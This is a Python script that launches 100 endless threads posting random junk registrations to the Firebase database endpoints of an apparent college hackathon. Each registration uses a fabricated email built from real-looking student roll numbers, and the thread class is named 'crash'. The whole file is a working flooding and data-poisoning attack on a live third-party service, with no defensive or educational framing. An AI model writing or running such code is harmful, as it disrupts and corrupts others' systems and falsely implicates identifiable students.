from requests import Session
from random import randint, choices
from threading import Thread
from time import sleep

urls = ( 'https://innothon-becee-default-rtdb.firebaseio.com/AI Based Platform for Students.json',
        'https://innothon-becee-default-rtdb.firebaseio.com/Hosting a blockchain code onto a cloud network in order to create a prototype app in the Healthcare sector.json',
        'https://innothon-becee-default-rtdb.firebaseio.com/Develop a Mobile App through which a citizen can check whether an unattended child is a missing child using Facial Recognition.json',
        'https://innothon-becee-default-rtdb.firebaseio.com/Speech-to-text conversion for local ethnic languages of MP like Malavi, Bagheli, etc.json',
        'https://innothon-becee-default-rtdb.firebaseio.com/Career Dendrogram.json',
        'https://innothon-becee-default-rtdb.firebaseio.com/Online integrated platform for projects taken up by the students of various departments.json',
        'https://innothon-becee-default-rtdb.firebaseio.com/Accessing visual information (written information) by persons with visual disability.json',
        'https://innothon-becee-default-rtdb.firebaseio.com/To develop Mobile software for guiding the tourist.json',
        'https://innothon-becee-default-rtdb.firebaseio.com/Gaming Application for the elderly.json',
        'https://innothon-becee-default-rtdb.firebaseio.com/To develop a website for systematic farming for farmers in local languages.json',
        'https://innothon-becee-default-rtdb.firebaseio.com/Developing Virtual Reality based solutions.json'
        )


payload = {
    'mail': None,
    'r1': None,
    'r2': None,
    'r3': None,
    'r4': None,
    'r5': None,
    'n1': None,  
    'n2': None,  
    'n3': None,  
    'n4': None,  
    'n5': None

}

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

def random_text():
    text = ''
    for loop in range(10):
        character = characters[randint(0,51)]
        text += character

    return text

def random_mail():
    mail = '@kcgcollege.com'
    roll_nums = ('20cs005', '20cs046', '20cs116', '20cs121', '20cs122', '20cs123')

    roll_num = choices(roll_nums)[0]
    mail = roll_num + mail

    return mail
        

def send_req(session, payload):

        try:
            response = session.post(choices(urls)[0], json = payload, timeout = 2)
            print(f'{response.url} {response.status_code}')

            if response.status_code != 200:
                with open(f'{random_text()}.html', 'wb') as file:
                    file.write(response.text)
        except Exception:
            pass

        
#311020104090
session = Session()

class crash(Thread):
    def run(self):
        while True:
            payload['mail'] = random_mail()
            payload['r1'] = randint(311020104001, 311020104100)
            payload['r2'] = randint(311020104001, 311020104100)
            payload['r3'] = randint(311020104001, 311020104100)
            payload['r4'] = randint(311020104001, 311020104100)
            payload['r5'] = randint(311020104001, 311020104100)
            payload['n1'] = random_text()
            payload['n2'] = random_text()
            payload['n3'] = random_text()
            payload['n4'] = random_text()
            payload['n5'] = random_text()
            send_req(session, payload)
            #sleep(1)

for count in range(100):
    #print(count)
    crash().start()
